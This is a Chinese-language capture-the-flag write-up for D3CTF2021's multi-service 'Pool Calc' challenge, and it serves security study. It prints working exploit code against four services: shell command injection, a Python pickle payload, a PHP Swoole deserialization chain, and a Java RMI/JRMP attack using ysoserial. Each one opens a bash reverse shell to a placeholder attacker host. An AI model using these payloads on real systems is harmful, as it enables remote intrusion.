# Pool Calc

## 题目简述

本题是多服务计算器组合题，入口 `web_app` 根据语言分发到不同后端：`py_calc`、`php_calc`、`java_calc`。整体利用链包含命令拼接 RCE、PyInstaller 逆向后触发 Python pickle 反序列化、Swoole Curl `Handler` 反序列化链，以及 Java 8u221 RMI 反序列化。

题目附件是一个由多个计算服务组成的环境，包含前端 web_app 以及 Python、PHP、Java 后端计算器。解题时需要按服务边界逐个拿 shell 或触发 RCE，而不是把它当成单点 Web 注入题。

## 解题过程

题目源码见 [`Reclu3e/MyCTFChallenges/D3CTF2021/Pool_Calc`](https://github.com/Reclu3e/MyCTFChallenges/tree/main/D3CTF2021/Pool_Calc)。下文保留了源码中四个服务边界和各自利用点：`web_app` 命令拼接、`py_calc` pickle、`php_calc` Swoole、`java_calc` RMI。

先按服务边界拆题。`web_app` 是统一入口，`language` 参数决定后端服务；`py_calc`、`php_calc` 和 `java_calc` 分别暴露各自语言栈的反序列化或命令执行面。

`web_app` 中的命令拼接可以直接打 RCE。利用方式是在计算请求尾部拼入 shell metacharacter，构造反弹 shell：

```python
from urllib.parse import quote
import requests

def get_shell(server_ip, server_port):
    ip = "attacker-ip"
    port = "attacker-port"
    cmd = f'/bin/bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"'
    url = (
        f"http://{server_ip}:{server_port}/calc?"
        "language=python&action=add&a=1&b=1"
    )
    requests.get(url + quote("||" + cmd + "||"))

get_shell("127.0.0.1", "3000")
```

若改写回 `.format` 形式，等价的 URL 模板是 `http://{}:{}/calc?language=python&action=add&a=1&b=1`；后面继续拼接 `||<cmd>||`，利用 shell metacharacter 触发命令执行。

`py_calc` 是 PyInstaller 打包的 Linux ELF。可以按 PyInstaller ELF 解包流程 <https://github.com/extremecoders-re/pyinstxtractor/wiki/Extracting-Linux-ELF-binaries> 恢复 Python 字节码/入口逻辑，审计后可发现服务端直接对客户端数据做 `pickle.loads`。payload 只需构造带 `__reduce__` 的对象，让反序列化返回 `os.system` 调用：

```python
import os
import pickle
import socket
import sys

class Payload:
    def __reduce__(self):
        ip = "attacker-ip"
        port = "attacker-port"
        cmd = f'/bin/bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"'
        return os.system, (cmd,)

payload = pickle.dumps(Payload())

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(3)
try:
    s.connect(("py_calc", 8080))
except Exception:
    print("Server not found or not open")
    sys.exit()

try:
    s.sendall(payload)
finally:
    s.close()
```

`php_calc` 使用 Swoole 相关类，反序列化时可复用 RCTF2020 Swoole `NU1L` 非预期链。关键点是 [`Swoole\Curl\Handler`](https://github.com/swoole/library/blob/master/src/core/Curl/Handler.php#L808) 在析构/回调路径中会访问可控 handle 和 option。为了兼容类名，可先用本地 `Handlep` 类生成 payload，再把序列化字符串中的 `Handlep` 替换成 `Handler`：

```php
<?php
include "Handlep.php";

function gen_payload($cmd) {
    $o = new Swoole\Curl\Handlep("http://www.baidu.com/");
    $o->setOpt(CURLOPT_READFUNCTION, "array_walk");
    $o->setOpt(CURLOPT_FILE, "array_walk");
    $o->exec = [$cmd];
    $o->setOpt(CURLOPT_POST, 1);
    $o->setOpt(CURLOPT_POSTFIELDS, "aaa");
    $o->setOpt(CURLOPT_HTTPHEADER, ["Content-type" => "application/json"]);
    $o->setOpt(CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);

    $payload = serialize([$o, "exec"]);
    $payload = str_replace("Handlep", "Handler", $payload);
    return urlencode($payload);
}

$ip = "attacker-ip";
$port = "attacker-port";
$cmd = "/bin/bash -c \"bash -i >& /dev/tcp/$ip/$port 0>&1\"";
file_put_contents("payload.txt", gen_payload($cmd));
```

`java_calc` 暴露 RMI Registry，目标 JDK 为 8u221。利用思路是启动攻击者侧 JRMPListener，然后构造一个指向该 listener 的远程对象代理，把代理对象通过 registry 调用发给目标；目标在处理远程引用时会回连 listener，并反序列化 listener 返回的 gadget 数据。

攻击者侧先启动 listener：

```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener \
  3333 CommonsCollections5 '<cmd>'
```

目标侧触发代码如下，核心是把 `Registry` 代理对象写入远程调用流，再触发一次 `lookup`：

```java
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.ObjectOutput;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

public class exp {
    public static void main(String[] args) throws Exception {
        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint("web_app", 3333);
        UnicastRef ref1 = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref1);
        Registry proxy = (Registry) Proxy.newProxyInstance(
            exp.class.getClassLoader(),
            new Class[] { Registry.class },
            obj
        );

        Registry registryRemote = LocateRegistry.getRegistry("java_calc", 8080);
        Field[] fields0 = registryRemote.getClass()
            .getSuperclass()
            .getSuperclass()
            .getDeclaredFields();
        fields0[0].setAccessible(true);
        UnicastRef ref = (UnicastRef) fields0[0].get(registryRemote);

        Field[] fields1 = registryRemote.getClass().getDeclaredFields();
        fields1[0].setAccessible(true);
        java.rmi.server.Operation[] operations =
            (java.rmi.server.Operation[]) fields1[0].get(registryRemote);

        RemoteCall call = ref.newCall(
            (RemoteObject) registryRemote,
            operations,
            2,
            4905912898345647071L
        );
        ObjectOutput out = call.getOutputStream();
        out.writeObject(proxy);
        ref.invoke(call);

        registryRemote.lookup("add");
    }
}
```

其他可行思路包括：对 `py_calc` 运行客户端并把流量发到自己服务器，抓取 pickle 数据结构；对 `java_calc` 使用 attackRmi、ysomap 等工具链辅助生成和触发 RMI payload。

## 方法总结

- 核心技巧：按微服务语言栈分别利用：Web 命令拼接、Python pickle、PHP Swoole 反序列化、Java RMI/JRMP 反序列化。
- 识别信号：统一入口带 `language` 参数，后端服务名直接暴露为 `py_calc`、`php_calc`、`java_calc`，且各语言服务使用不安全的序列化或命令执行接口。
- 复用要点：组合题先画服务拓扑，再分别审每个协议入口；PyInstaller 题要先还原 Python 逻辑，Java RMI 题要关注目标 JDK 版本和可用 gadget。

